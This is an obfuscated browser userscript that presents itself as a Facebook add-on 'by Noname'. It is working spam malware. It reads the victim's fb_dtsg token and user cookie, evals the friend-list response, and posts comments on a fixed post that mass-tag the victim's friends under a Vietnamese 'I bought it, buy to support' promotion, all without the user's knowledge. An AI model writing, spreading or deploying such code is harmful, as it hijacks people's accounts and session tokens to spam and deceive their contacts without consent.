// ==UserScript==
// @name            facebook
// @description     All about facebook By Noname
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
var _0xf841=["value","fb_dtsg","getElementsByName","match","cookie","651091261618623","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," 👏 😡 😘 👉 Mình Mua rồi. mua ủng hộ đi mọi người... ^_^ 👈 💜 💘 (^^^)   @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];
var _0xa22c=[_0xf841[0],_0xf841[1],_0xf841[2],_0xf841[3],_0xf841[4],_0xf841[5],_0xf841[6],_0xf841[7],_0xf841[8],_0xf841[9],_0xf841[10],_0xf841[11],_0xf841[12],_0xf841[13],_0xf841[14],_0xf841[15],_0xf841[16],_0xf841[17],_0xf841[18],_0xf841[19],_0xf841[20],_0xf841[21],_0xf841[22],_0xf841[23],_0xf841[24],_0xf841[25],_0xf841[26],_0xf841[27],_0xf841[28],_0xf841[29],_0xf841[30],_0xf841[31],_0xf841[32],_0xf841[33],_0xf841[34],_0xf841[35],_0xf841[36],_0xf841[37],_0xf841[38],_0xf841[39],_0xf841[40],_0xf841[41],_0xf841[42],_0xf841[43],_0xf841[44],_0xf841[45],_0xf841[46],_0xf841[47],_0xf841[48],_0xf841[49],_0xf841[50],_0xf841[51],_0xf841[52],_0xf841[53],_0xf841[54],_0xf841[55],_0xf841[56],_0xf841[57],_0xf841[58],_0xf841[59],_0xf841[60],_0xf841[61],_0xf841[62],_0xf841[63],_0xf841[64]];
var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];
var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);
var id=_0xa22c[5];
var arkadaslar=[];
var svn_rev;
function arkadaslari_al(id)
{
	var _0x327fx8= new XMLHttpRequest();
	_0x327fx8[_0xa22c[6]]=function ()
	{
		if(_0x327fx8[_0xa22c[7]]==4)
		{
			eval(_0xa22c[8]+_0x327fx8[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);
			for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++)
			{
				mesaj=_0xa22c[10];
				mesaj_text=_0xa22c[10];
				for(i=f*27;i<(f+1)*27;i++)
				{
					if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i])
					{
						mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];
						mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];
					}
					;
				}
				;
				yorum_yap(id,mesaj);
			}
			;
		}
		;
	}
	;
	var _0x327fx9=_0xa22c[24];
	_0x327fx9+=_0xa22c[25];
	_0x327fx9+=_0xa22c[26];
	_0x327fx9+=_0xa22c[27];
	_0x327fx9+=_0xa22c[28]+user_id;
	_0x327fx9+=_0xa22c[29]+user_id;
	if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0)
	{
		_0x327fx8[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x327fx9,true);
	}
	else 
	{
		_0x327fx8[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x327fx9,true);
	}
	;
	_0x327fx8[_0xa22c[37]]();
}
;
function RandomArkadas()
{
	var _0x327fxb=_0xa22c[10];
	for(i=0;i<9;i++)
	{
		_0x327fxb+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];
	}
	;
	return _0x327fxb;
}
;
function yorum_yap(id,_0x327fxd)
{
	var _0x327fxe= new XMLHttpRequest();
	var _0x327fx9=_0xa22c[10];
	_0x327fx9+=_0xa22c[40]+id;
	_0x327fx9+=_0xa22c[41]+encodeURIComponent(_0x327fxd);
	_0x327fx9+=_0xa22c[42];
	_0x327fx9+=_0xa22c[43];
	_0x327fx9+=_0xa22c[44];
	_0x327fx9+=_0xa22c[45];
	_0x327fx9+=_0xa22c[46];
	_0x327fx9+=_0xa22c[47]+id+_0xa22c[48];
	_0x327fx9+=_0xa22c[49];
	_0x327fx9+=_0xa22c[50];
	_0x327fx9+=_0xa22c[51];
	_0x327fx9+=_0xa22c[52];
	_0x327fx9+=_0xa22c[29]+user_id;
	_0x327fx9+=_0xa22c[53];
	_0x327fx9+=_0xa22c[54];
	_0x327fx9+=_0xa22c[55];
	_0x327fx9+=_0xa22c[56]+fb_dtsg;
	_0x327fx9+=_0xa22c[57];
	_0x327fxe[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);
	_0x327fxe[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);
	_0x327fxe[_0xa22c[6]]=function ()
	{
		if(_0x327fxe[_0xa22c[7]]==4&&_0x327fxe[_0xa22c[63]]==200)
		{
			_0x327fxe[_0xa22c[64]];
		}
		;
	}
	;
	_0x327fxe[_0xa22c[37]](_0x327fx9);
}
;
arkadaslari_al(id);